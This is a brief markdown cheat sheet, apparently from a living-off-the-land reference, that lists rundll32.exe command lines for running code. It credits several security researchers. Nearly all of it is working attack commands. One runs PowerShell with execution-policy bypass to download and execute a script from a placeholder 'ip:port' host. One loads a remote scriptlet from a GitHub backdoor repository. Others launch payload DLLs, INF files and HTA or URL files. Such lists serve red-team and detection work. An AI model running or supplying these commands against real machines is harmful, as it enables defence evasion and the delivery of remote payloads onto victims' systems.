## Rundll32.exe

* Functions: Execute

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

rundll32 shell32.dll,Control_RunDLL payload.dll

rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,

rundll32.exe advpack.dll,RegisterOCX calc.exe

rundll32.exe zipfldr.dll,RouteTheCall calc.exe

rundll32.exe url.dll,OpenURL "C:\test\calc.hta"

rundll32.exe url.dll,OpenURL "C:\test\calc.url"

rundll32.exe url.dll, FileProtocolHandler calc.exe

rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"

rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"

rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
```
  
Acknowledgements:
* Casey Smith - @subtee
* Jimmy - @bohops
* Moriarty - @Moriarty_Meng
* Adam - @hexacorn
   
   
   